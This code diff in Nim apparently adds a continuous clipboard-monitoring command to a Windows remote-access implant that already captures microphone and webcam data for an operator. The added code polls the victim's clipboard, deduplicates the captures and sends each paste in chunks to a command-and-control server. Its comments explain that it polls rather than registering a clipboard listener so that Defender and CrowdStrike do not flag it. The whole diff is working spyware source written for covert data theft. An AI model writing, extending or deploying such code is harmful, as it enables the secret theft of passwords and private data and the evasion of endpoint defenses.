@@ -113,6 +113,22 @@ const
   # set this huge to keep the file open until the agent sends a
   # final `last_chunk: true` on unlisten.
   MIC_LISTEN_TOTAL_SENTINEL = 1_000_000
+  # Clipwatch: continuous clipboard monitor.
+  # 1.5s default cadence catches anything a human can physically
+  # copy. Clamped to 0.5..30s. Smaller than 500ms and we just
+  # thrash OpenClipboard (which fails when other apps hold it).
+  CLIPWATCH_DEFAULT_MS = 1500
+  CLIPWATCH_MIN_MS     = 500
+  CLIPWATCH_MAX_MS     = 30_000
+  # 16 KB cap on a single paste. Anything longer (SQL dumps, PDF
+  # contents, etc.) gets truncated with a [truncated] marker. The
+  # agent never writes the full content to disk — we cap in memory.
+  CLIPWATCH_MAX_TEXT_BYTES = 16_384
+  # Ring buffer between capture thread and main async drain.
+  # 64 KB holds ~3 captures of typical paste length (4-8 KB)
+  # before we'd start dropping. If the operator's C2 link is
+  # so slow that 3 captures queue up, they have bigger problems.
+  CLIPWATCH_RING_CAP = 65_536
   # Survival flags. Default to FALSE for "silent" variant. Use
   # compile-time flags to enable for the engagement/aggressive
   # variants — see build.ps1.
@@ -1233,6 +1249,53 @@ var
   micListenStartedAt: MonoTime
 var micListenThreadVar: Thread[void]
 
+# ------------------------------------------------------------
+# CLIPBOARD WATCH  (operator -> clipwatch <id> [interval_s])
+# ------------------------------------------------------------
+# Polling-based continuous clipboard monitor. The capture thread
+# calls OpenClipboard + GetClipboardData on a timer (default 1.5s,
+# configurable). New text is pushed into a raw ring buffer; an async
+# drain task on the main event loop pops it and ships each capture
+# as a `file_chunk` to the server.
+#
+# Why polling and not AddClipboardFormatListener: registering a
+# clipboard listener is a sharp EDR signature (Defender for
+# Endpoint, CrowdStrike flag processes that subscribe to clipboard
+# events). A periodic OpenClipboard is "quieter" in telemetry.
+#
+# Design notes:
+#   - Uses raw memory for the ring + lastText (same GC-safety
+#     pattern as micListen). No GC types touched from the thread.
+#   - Dedupe: identical-to-last capture is dropped. Avoids spamming
+#     the operator when the user copies the same selection 10x.
+#   - Size cap: CLIPWATCH_MAX_TEXT_BYTES per paste. Truncated pastes
+#     get a [truncated] suffix so the operator knows.
+#   - Format: CF_UNICODETEXT first, CF_TEXT fallback. Non-text
+#     formats are recorded as a one-line marker (no binary exfil).
+#   - One file per capture on the server side (clip_<ms>_<seq>.txt),
+#     each containing a single timestamped paste. Easy to triage.
+var
+  clipwatchRunning = false
+  clipwatchLock: Lock
+  # Ring buffer (raw, no GC)
+  clipwatchRing: ptr UncheckedArray[byte] = nil
+  clipwatchRingCap: int = 0
+  clipwatchRingHead: int = 0
+  clipwatchRingTail: int = 0
+  clipwatchRingCount: int = 0
+  # Last captured text (UTF-8) for dedupe.
+  clipwatchLastText: array[CLIPWATCH_MAX_TEXT_BYTES + 16, byte]
+  clipwatchLastTextLen: int = 0
+  clipwatchLastFormatId: int = 0   # 0 = none, 13 = CF_UNICODETEXT, 1 = CF_TEXT
+  # Operational state
+  clipwatchIntervalMs: int = CLIPWATCH_DEFAULT_MS
+  clipwatchChunkIdx: int = 0
+  clipwatchCaptureCount: int = 0
+  clipwatchStartedAt: MonoTime
+  clipwatchSkippedContention: int = 0  # diagnostic counter
+  clipwatchStalled: bool = false
+var clipwatchThreadVar: Thread[void]
+
 proc getMicListenFilename(): string =
   # View into the fixed-size byte array, returned as a regular string
   # only for the duration of one expression (safe because nothing
@@ -1537,7 +1600,7 @@ proc captureMic(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
   var wav = buildMicWavHeader(sampleRate, channels, bitsPerSample, pcm.len)
   for sampleByte in pcm: wav.add(sampleByte)
 
-  let ts = getTime().toUnix
+  let ts = int(getTime().toUnix * 1000) + rand(1000)
   let filename = "mic_" & $ts & ".wav"
   let chunkSize = 524288
   let totalChunks = (wav.len + chunkSize - 1) div chunkSize
@@ -1709,6 +1772,243 @@ proc micListenDrainTask(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
         await sleepAsync(20)
 
 # ------------------------------------------------------------
+# CLIPBOARD WATCH — capture thread + async drain
+# ------------------------------------------------------------
+# ISO-like local timestamp for the paste header.
+proc padInt(n: int, width: int): string =
+  # Zero-padded integer. width=2 → "07", "12"; width=4 → "2026".
+  result = $n
+  while result.len < width:
+    result = "0" & result
+
+proc getLocalTimeStr(): string =
+  let t = now()
+  result = padInt(int(t.year), 4) & "-" & padInt(int(ord(t.month) + 1), 2) & "-" &
+            padInt(int(t.monthday), 2) & " " & padInt(int(t.hour), 2) & ":" &
+            padInt(int(t.minute), 2) & ":" & padInt(int(t.second), 2)
+
+# Polling cadence. Sleep is broken into shorter slices so the
+# `clipwatchRunning` flag flips to false within ~50ms of the
+# operator's `unclipwatch`, not 1500ms later.
+proc clipwatchSleepInterruptible(ms: int) =
+  # Best-effort responsive sleep. Splits into 50ms slices and
+  # checks clipwatchRunning between them. Used by the capture
+  # thread so `unclipwatch` is fast.
+  var remaining = ms
+  while remaining > 0 and clipwatchRunning:
+    let slice = min(50, remaining)
+    sleep(slice)
+    dec remaining, slice
+
+proc clipwatchCaptureThread() {.thread.} =
+  # Polls the clipboard at clipwatchIntervalMs. When the text
+  # changes, writes the framed record into the ring buffer.
+  #
+  # Each record in the ring has a small header:
+  #   4 bytes:  text length (LE, uint32)
+  #   N bytes:  UTF-8 text
+  # The drain task reads the length, then N bytes.
+  var hwndTryOwner: HWND = 0
+  while clipwatchRunning:
+    clipwatchSleepInterruptible(clipwatchIntervalMs)
+    if not clipwatchRunning: break
+
+    # Try to open the clipboard. Another app may hold it; that's
+    # normal (e.g. user is mid-paste). Skip this tick.
+    if OpenClipboard(hwndTryOwner) == 0:
+      inc clipwatchSkippedContention
+      continue
+
+    # Try Unicode text first, fall back to ANSI.
+    var captured = false
+    var fmtId = 0
+    var textPtr: LPSTR = nil
+    var textLen = 0
+    let hUni = GetClipboardData(CF_UNICODETEXT)
+    if hUni != 0:
+      let locked = GlobalLock(hUni)
+      if locked != nil:
+        # Wide string length (in chars, not bytes). Walk till NUL.
+        let wstr = cast[ptr UncheckedArray[WCHAR]](locked)
+        var wlen = 0
+        while wlen < CLIPWATCH_MAX_TEXT_BYTES * 2 and wstr[wlen] != cast[WCHAR](0):
+          inc wlen
+        # Convert UTF-16 to UTF-8 in-place. Use Windows WideCharToMultiByte.
+        let wstrPtr = cast[LPCWCH](wstr)
+        let utf8Len = WideCharToMultiByte(CP_UTF8, DWORD(0), wstrPtr, int32(wlen),
+                                          nil, 0, nil, nil)
+        if utf8Len > 0 and utf8Len <= CLIPWATCH_MAX_TEXT_BYTES:
+          # Convert directly into a local buffer, then into ring.
+          var utf8buf: array[CLIPWATCH_MAX_TEXT_BYTES + 16, byte]
+          let n = WideCharToMultiByte(CP_UTF8, DWORD(0), wstrPtr, int32(wlen),
+                                      cast[LPSTR](addr utf8buf[0]),
+                                      int32(CLIPWATCH_MAX_TEXT_BYTES), nil, nil)
+          if n > 0:
+            # Dedupe against last.
+            var isDup = false
+            if clipwatchLastTextLen == n:
+              var same = true
+              for j in 0..<n:
+                if utf8buf[j] != clipwatchLastText[j]:
+                  same = false; break
+              isDup = same
+            if not isDup and clipwatchRing != nil:
+              # Push framed record to ring. Drop if not enough room.
+              let recordSize = 4 + n
+              acquire(clipwatchLock)
+              if clipwatchRingCount + recordSize <= clipwatchRingCap:
+                # Write length (LE uint32)
+                clipwatchRing[clipwatchRingHead]     = byte(n and 0xFF)
+                clipwatchRing[(clipwatchRingHead+1) mod clipwatchRingCap] = byte((n shr 8) and 0xFF)
+                clipwatchRing[(clipwatchRingHead+2) mod clipwatchRingCap] = byte((n shr 16) and 0xFF)
+                clipwatchRing[(clipwatchRingHead+3) mod clipwatchRingCap] = byte((n shr 24) and 0xFF)
+                clipwatchRingHead = (clipwatchRingHead + 4) mod clipwatchRingCap
+                # Write bytes
+                var j = 0
+                while j < n:
+                  clipwatchRing[clipwatchRingHead] = utf8buf[j]
+                  clipwatchRingHead = (clipwatchRingHead + 1) mod clipwatchRingCap
+                  inc j
+                inc clipwatchRingCount, recordSize
+              release(clipwatchLock)
+              if not isDup:
+                # Update dedupe buffer.
+                for j in 0..<n: clipwatchLastText[j] = utf8buf[j]
+                clipwatchLastTextLen = n
+                clipwatchLastFormatId = 13  # CF_UNICODETEXT
+                inc clipwatchCaptureCount
+            captured = true
+        discard GlobalUnlock(hUni)
+    elif GetClipboardData(CF_TEXT) != 0:
+      # ANSI fallback path
+      let hAnsi = GetClipboardData(CF_TEXT)
+      if hAnsi != 0:
+        let locked = GlobalLock(hAnsi)
+        if locked != nil:
+          let astr = cast[ptr UncheckedArray[cchar]](locked)
+          var alen = 0
+          while alen < CLIPWATCH_MAX_TEXT_BYTES and astr[alen] != 0.cchar:
+            inc alen
+          if alen > 0:
+            var isDup = false
+            if clipwatchLastTextLen == alen:
+              var same = true
+              for j in 0..<alen:
+                if byte(astr[j]) != clipwatchLastText[j]:
+                  same = false; break
+              isDup = same
+            if not isDup and clipwatchRing != nil:
+              let recordSize = 4 + alen
+              acquire(clipwatchLock)
+              if clipwatchRingCount + recordSize <= clipwatchRingCap:
+                clipwatchRing[clipwatchRingHead]     = byte(alen and 0xFF)
+                clipwatchRing[(clipwatchRingHead+1) mod clipwatchRingCap] = byte((alen shr 8) and 0xFF)
+                clipwatchRing[(clipwatchRingHead+2) mod clipwatchRingCap] = byte((alen shr 16) and 0xFF)
+                clipwatchRing[(clipwatchRingHead+3) mod clipwatchRingCap] = byte((alen shr 24) and 0xFF)
+                clipwatchRingHead = (clipwatchRingHead + 4) mod clipwatchRingCap
+                var j = 0
+                while j < alen:
+                  clipwatchRing[clipwatchRingHead] = byte(astr[j])
+                  clipwatchRingHead = (clipwatchRingHead + 1) mod clipwatchRingCap
+                  inc j
+                inc clipwatchRingCount, recordSize
+              release(clipwatchLock)
+              if not isDup:
+                for j in 0..<alen: clipwatchLastText[j] = byte(astr[j])
+                clipwatchLastTextLen = alen
+                clipwatchLastFormatId = 1  # CF_TEXT
+                inc clipwatchCaptureCount
+            captured = true
+          discard GlobalUnlock(hAnsi)
+    else:
+      # No text on the clipboard. If the last capture was text and
+      # the clipboard now has any format, log a format change so
+      # the operator sees non-text activity. Cheap, just one
+      # push when state changes.
+      if clipwatchLastFormatId != 0 and clipwatchRing != nil:
+        # Don't pollute the ring; the operator can ask via `clip` if
+        # they want a snapshot. The dedupe-on-text-change covers
+        # the common case (text → text = no event).
+        discard
+    discard captured
+    discard fmtId
+    discard textPtr
+    discard textLen
+    CloseClipboard()
+
+proc clipwatchDrainTask(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
+                        ) {.async, gcsafe.} =
+  # Reads framed records from clipwatchRing and ships each one as
+  # a single file_chunk to the server (one file per paste).
+  # Stops when the thread is no longer running AND the ring is empty.
+  while clipwatchRunning or clipwatchRingCount > 0:
+    var recordLen = 0
+    acquire(clipwatchLock)
+    if clipwatchRingCount >= 4 and clipwatchRing != nil:
+      recordLen = int(clipwatchRing[clipwatchRingTail]) or
+                  (int(clipwatchRing[(clipwatchRingTail+1) mod clipwatchRingCap]) shl 8) or
+                  (int(clipwatchRing[(clipwatchRingTail+2) mod clipwatchRingCap]) shl 16) or
+                  (int(clipwatchRing[(clipwatchRingTail+3) mod clipwatchRingCap]) shl 24)
+      # Sanity: drop the record if length is unreasonable.
+      if recordLen < 0 or recordLen > CLIPWATCH_MAX_TEXT_BYTES:
+        recordLen = 0
+    release(clipwatchLock)
+
+    if recordLen > 0 and clipwatchRingCount >= 4 + recordLen:
+      # Read out the record under lock.
+      var text = newSeq[byte](recordLen)
+      acquire(clipwatchLock)
+      clipwatchRingTail = (clipwatchRingTail + 4) mod clipwatchRingCap
+      var j = 0
+      while j < recordLen:
+        text[j] = clipwatchRing[clipwatchRingTail]
+        clipwatchRingTail = (clipwatchRingTail + 1) mod clipwatchRingCap
+        inc j
+      dec clipwatchRingCount, 4 + recordLen
+      release(clipwatchLock)
+
+      # Frame as: "<ISO timestamp>\n<text>\n---\n"
+      var framed = newStringOfCap(40 + recordLen + 8)
+      framed.add(getLocalTimeStr() & "\n")
+      for k in 0..<recordLen:
+        framed.add(chr(text[k]))
+      framed.add("\n---\n")
+      let framedBytes = cast[seq[byte]](framed)
+
+      inc clipwatchChunkIdx
+      let ts = int(getTime().toUnix * 1000) + rand(1000)
+      let filename = "clip_" & $ts & "_" & $clipwatchChunkIdx & ".txt"
+      let chunkSize = 524288
+      let totalChunks = (framedBytes.len + chunkSize - 1) div chunkSize
+      var idx = 0
+      var off2 = 0
+      while off2 < framedBytes.len:
+        let n = min(chunkSize, framedBytes.len - off2)
+        try:
+          await sendToC2(%* {
+            "type": "file_chunk",
+            "filepath": filename,
+            "chunk_index": idx,
+            "total_chunks": totalChunks,
+            "data": base64.encode(framedBytes[off2 ..< off2 + n]),
+            "last_chunk": off2 + n >= framedBytes.len
+          })
+        except:
+          # Connection gone — stop the drain. The capture thread
+          # will keep trying until the operator sends unclipwatch.
+          clipwatchRunning = false
+          clipwatchStalled = true
+          return
+        inc idx
+        off2 += n
+    else:
+      if recordLen > 0:
+        # Partial record in the ring — wait for the rest.
+        await sleepAsync(20)
+      elif clipwatchRunning:
+        await sleepAsync(30)
+
+# ------------------------------------------------------------
 # WEBCAM CAPTURE  (operator -> cam <id> [device])
 # ------------------------------------------------------------
 # Video-for-Windows single-shot capture. Steps:
@@ -1829,7 +2129,7 @@ proc captureCam(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
         for j in 0..<chunk: bmp.add(byte(src[copied + j]))
         inc copied, chunk
 
-      let ts = getTime().toUnix
+      let ts = int(getTime().toUnix * 1000) + rand(1000)
       let filename = "cam_" & $ts & ".bmp"
       let chunkSize = 524288
       let totalChunks = (bmp.len + chunkSize - 1) div chunkSize
@@ -2024,6 +2324,76 @@ proc handleCommand(sc: SessionCrypto, cmd: JsonNode,
       except:
         dev = 0
     await sendToC2(await captureCam(sendToC2, dev))
+  of "clipwatch":
+    # Continuous clipboard monitor. args = poll interval in seconds
+    # (optional, default 1.5s, clamped to 0.5..30s). One file per
+    # paste in downloads/<id>/clip_<unix>_<seq>.txt.
+    if clipwatchRunning:
+      await sendToC2(%* {"type": "output",
+                        "data": "[!] already clipwatching (interval=" &
+                                $(clipwatchIntervalMs div 1000) & "s)"})
+      return
+    var intervalSec = CLIPWATCH_DEFAULT_MS div 1000
+    if cmdArgs.len > 0:
+      try:
+        intervalSec = int(parseFloat(cmdArgs.split(' ', 1)[0]))
+      except:
+        intervalSec = CLIPWATCH_DEFAULT_MS div 1000
+    # Convert to ms and clamp.
+    var intervalMs = intervalSec * 1000
+    if intervalMs < CLIPWATCH_MIN_MS: intervalMs = CLIPWATCH_MIN_MS
+    if intervalMs > CLIPWATCH_MAX_MS: intervalMs = CLIPWATCH_MAX_MS
+    clipwatchIntervalMs = intervalMs
+    # Allocate the ring if not yet.
+    if clipwatchRing == nil:
+      clipwatchRingCap = CLIPWATCH_RING_CAP
+      clipwatchRing = cast[ptr UncheckedArray[byte]](alloc(clipwatchRingCap))
+      zeroMem(clipwatchRing, clipwatchRingCap)
+    clipwatchRingHead = 0
+    clipwatchRingTail = 0
+    clipwatchRingCount = 0
+    initLock(clipwatchLock)  # idempotent
+    clipwatchLastTextLen = 0
+    clipwatchLastFormatId = 0
+    clipwatchChunkIdx = 0
+    clipwatchCaptureCount = 0
+    clipwatchSkippedContention = 0
+    clipwatchStalled = false
+    clipwatchStartedAt = getMonoTime()
+    clipwatchRunning = true
+    createThread(clipwatchThreadVar, clipwatchCaptureThread)
+    asyncCheck clipwatchDrainTask(sendToC2)
+    await sendToC2(%* {"type": "output",
+                      "data": "[" & BuildPrefix & "] clipwatching @ " &
+                              $(intervalMs div 1000) & "." &
+                              $((intervalMs mod 1000) div 100) & "s" &
+                              " (cap=16KB/paste, dedupe=on)"})
+  of "unclipwatch":
+    if not clipwatchRunning:
+      await sendToC2(%* {"type": "output", "data": "[!] not clipwatching"})
+      return
+    clipwatchRunning = false
+    # Wait for the thread to actually exit (interruptible sleep
+    # bounds it to ~50ms after we set the flag).
+    joinThread(clipwatchThreadVar)
+    # Drain any remaining records from the ring (give the drain
+    # task up to 2s to finish).
+    var waitedMs = 0
+    while clipwatchRingCount > 0 and waitedMs < 2000:
+      await sleepAsync(20)
+      waitedMs += 20
+    let elapsed = (getMonoTime() - clipwatchStartedAt).inMilliseconds div 1000
+    let note = if clipwatchStalled: " (drain stalled, some captures may be lost)" else: ""
+    await sendToC2(%* {"type": "output",
+                      "data": "[" & BuildPrefix & "] clipwatch stopped after " &
+                              $elapsed & "s — " & $clipwatchCaptureCount &
+                              " captures, " & $clipwatchSkippedContention &
+                              " skipped (clipboard busy)" & note})
+    if clipwatchRing != nil:
+      dealloc(clipwatchRing)
+      clipwatchRing = nil
+    clipwatchLastTextLen = 0
+    clipwatchLastFormatId = 0
   of "mic":
     # args = seconds (optional, default 10, clamped to 1..120)
     var secs = MIC_DEFAULT_SECS
@@ -2067,7 +2437,7 @@ proc handleCommand(sc: SessionCrypto, cmd: JsonNode,
     micListenRingTail = 0
     micListenRingCount = 0
     initLock(micListenLock)  # idempotent
-    setMicListenFilename("mic_live_" & $getTime().toUnix & ".wav")
+    setMicListenFilename("mic_live_" & $int(getTime().toUnix * 1000) & $rand(1000) & ".wav")
     let fname = getMicListenFilename()
     micListenChunkIdx = 0
     micListenStalled = false
